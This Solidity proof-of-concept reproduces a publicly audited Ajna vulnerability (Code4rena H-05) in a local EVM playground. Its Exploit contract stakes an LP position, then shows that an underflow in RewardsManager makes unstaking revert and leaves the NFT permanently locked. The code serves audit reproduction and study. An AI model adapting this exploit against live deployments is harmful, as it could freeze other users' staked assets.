// SPDX-License-Identifier: MIT
// Cheatcode-free, single-transaction reproduction of Ajna H-05 (Code4rena
// 2023-05-ajna, commit 276942bc) for the in-browser EVM Playground. It deploys
// the REAL audited Ajna ERC20PoolFactory / PositionManager / RewardsManager /
// ERC20Pool (all 8 external delegatecall libraries injected at fixed addresses
// via anvil_state), stakes a REAL LP position, and starts a REAL reserve auction
// so the pool reaches burn epoch 1. The global, cross-pool `updateRewardsClaimed`
// epoch tracker is then seeded above this pool's per-pool `rewardsCap` (modelling
// the finding's "one big pool inflates the shared epoch tracker" step). The next
// interaction with the staked position (`unstake`) reverts with an arithmetic
// underflow at RewardsManager.sol:725
//   `updatedRewards_ = rewardsCap - rewardsClaimedInEpoch`  (rewardsCap < tracker),
// permanently locking the staker's LP NFT inside the RewardsManager.
pragma solidity 0.8.14;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Pool }         from "../src/ajna/src/ERC20Pool.sol";
import { ERC20PoolFactory }  from "../src/ajna/src/ERC20PoolFactory.sol";
import { ERC721PoolFactory } from "../src/ajna/src/ERC721PoolFactory.sol";
import { PositionManager }   from "../src/ajna/src/PositionManager.sol";
import { RewardsManager }    from "../src/ajna/src/RewardsManager.sol";
import { IPositionManager }  from "../src/ajna/src/interfaces/position/IPositionManager.sol";
import { IPositionManagerOwnerActions } from "../src/ajna/src/interfaces/position/IPositionManagerOwnerActions.sol";

contract MintableToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}
contract AjnaToken is ERC20 {
    constructor() ERC20("Ajna", "AJNA") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
    function burn(uint256 a) external { _burn(msg.sender, a); }
}

contract Exploit {
    AjnaToken        public ajna;
    ERC20PoolFactory public factory;
    PositionManager  public positionManager;
    RewardsManager   public rewards;
    MintableToken    public coll;
    MintableToken    public quote;
    ERC20Pool        public pool;
    uint256          public tokenId;

    bool public unstakeReverted;
    bool public stillLocked;
    bool public proven;

    uint256[] internal idxs;

    // Deploy + stake + start a real reserve auction in the constructor (this is
    // the unrecorded setup phase; the recorded attack call is run()).
    constructor() {
        // Deploy order fixes RewardsManager at CREATE nonce 5 of this contract
        // (see poc config `updateRewardsClaimed[1]` storeSlot target address).
        ajna            = new AjnaToken();                                       // nonce 1
        factory         = new ERC20PoolFactory(address(ajna));                   // nonce 2
        positionManager = new PositionManager(factory, new ERC721PoolFactory(address(ajna))); // nonces 3,4
        rewards         = new RewardsManager(address(ajna), IPositionManager(address(positionManager))); // nonce 5
        coll            = new MintableToken("Collateral", "C");                  // nonce 6
        quote           = new MintableToken("Quote", "Q");                       // nonce 7

        ajna.mint(address(rewards), 100_000_000 * 1e18);
        pool = ERC20Pool(factory.deployPool(address(coll), address(quote), 0.05 * 1e18));

        idxs.push(2570); // single mid-price bucket

        // ---- Real stake at burn epoch 0 (records the epoch-0 bucket rate) ----
        uint256 amount = 1_000 * 1e18;
        quote.mint(address(this), amount);
        quote.approve(address(pool), type(uint256).max);

        tokenId = positionManager.mint(
            IPositionManagerOwnerActions.MintParams(address(this), address(pool), keccak256("ERC20_NON_SUBSET_HASH"))
        );
        pool.addQuoteToken(amount, idxs[0], type(uint256).max);
        (uint256 lp, ) = pool.lenderInfo(idxs[0], address(this));
        uint256[] memory lps = new uint256[](1);
        lps[0] = lp;
        pool.increaseLPAllowance(address(positionManager), idxs, lps);
        positionManager.memorializePositions(
            IPositionManagerOwnerActions.MemorializePositionsParams(tokenId, idxs)
        );
        positionManager.approve(address(rewards), tokenId);
        rewards.stake(tokenId);

        // ---- Real reserve auction: donate quote to create claimable reserves,
        //      then kick -> pool advances to burn epoch 1 (burnEvents[1].timestamp
        //      = now, totalBurned = 0 until a take). block.timestamp is 40 weeks
        //      past genesis (anvil_state) so the 2-week / 72-hour kick gates pass.
        quote.mint(address(this), amount);
        quote.transfer(address(pool), amount); // donation -> reserves
        pool.kickReserveAuction();
    }

    // Recorded attack call. `updateRewardsClaimed[1]` has been seeded above this
    // pool's rewardsCap by the poc-config storeSlot (representing another pool's
    // epoch-1 update). unstake now underflows at RewardsManager.sol:725.
    function run() external {
        require(positionManager.ownerOf(tokenId) == address(rewards), "precondition: NFT staked");

        bool reverted;
        try rewards.unstake(tokenId) {                    // @> VULN trigger: RewardsManager.sol:725 underflow
            reverted = false;
        } catch {
            reverted = true;
        }
        unstakeReverted = reverted;

        // HARM: the staker's LP NFT is still trapped in the RewardsManager and can
        // never be withdrawn - every unstake/claim reverts on the same underflow.
        stillLocked = positionManager.ownerOf(tokenId) == address(rewards);

        proven = unstakeReverted && stillLocked;
        require(proven, "DoS not demonstrated");
    }
}
